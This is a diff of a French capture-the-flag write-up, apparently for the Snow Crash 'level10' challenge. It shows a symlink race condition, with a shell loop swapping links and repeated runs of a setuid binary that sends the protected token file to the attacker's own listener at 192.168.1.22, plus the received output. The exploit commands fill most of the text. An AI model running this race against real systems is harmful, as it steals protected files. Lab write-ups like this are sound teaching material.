@@ -109,17 +109,13 @@ On va créer un fichier tout simple avec les bons droits
 
 Ensuite il nous faudra un fichier /tmp/faketoken qui va etre un lien un coup vers token pour le lire, un coup vers "/tmp/coucou" pour passer les droits. Tout ça très vite pour faire une race condition
 
-On va donc utiliser 2 boucles infinies de création de ces liens
+On va donc utiliser une boucle infinie de création de ces liens
 
-La première pour les liens alternativement. En background pour pouvoir continuer a utiliser le shell
+En background pour pouvoir continuer a utiliser le shell
 
 	$ $(while true; do ln -sf /tmp/coucou /tmp/faketoken; ln -sf $(pwd)/token /tmp/faketoken; done)&
 
-Deuxieme boucle infinie avec le programe level10 pour envoyer notre fichier "faketoken" et que ça tombe au bon moment avec l'autre boucle
-
-	$ $(while true; do ./level10 /tmp/faketoken 192.168.1.22; done) &
-
-On lance le serveur de notre côté plusieurs fois et on attends de recevoir le bon fichier
+On lance le serveur de notre côté et sur la vm on envoi le fichier, plusieurs fois pour bien tomber
 
 	$ ./server.py
 	starting up on 192.168.1.22 port 6969
@@ -128,3 +124,11 @@ On lance le serveur de notre côté plusieurs fois et on attends de recevoir le 
 	received "b'.*( )*.\n'"
 	received "b'XXXXXXXXXXXXXXXXXXXX\n'"
 	received "b''"
+
+	$ ./level10 /tmp/lien 192.168.1.22
+	You don't have access to /tmp/lien
+	$ ./level10 /tmp/lien 192.168.1.22
+	You don't have access to /tmp/lien
+	$ ./level10 /tmp/lien 192.168.1.22
+	Connecting to 192.168.1.22:6969 .. Connected!
+	Sending file .. wrote file!
